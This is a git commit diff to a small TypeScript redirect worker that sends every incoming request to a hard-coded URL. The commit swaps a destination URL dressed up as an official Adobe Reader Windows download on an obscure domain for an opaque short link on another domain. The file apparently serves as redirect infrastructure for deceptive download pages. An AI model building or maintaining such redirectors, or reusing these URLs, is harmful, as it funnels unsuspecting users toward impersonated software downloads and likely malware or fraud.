af0fe0a9e31680facce20e612da4128114241a93
owostic101 <charles_still@aol.com>
2025-09-09 12:02:57 -0500

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://ligelyu.qpon/get.adobe.com-reader-download-os-Windows-10name-Reader+2025.001.20630+English+Windows"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://netvigatol.com/JFyHyfNR"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
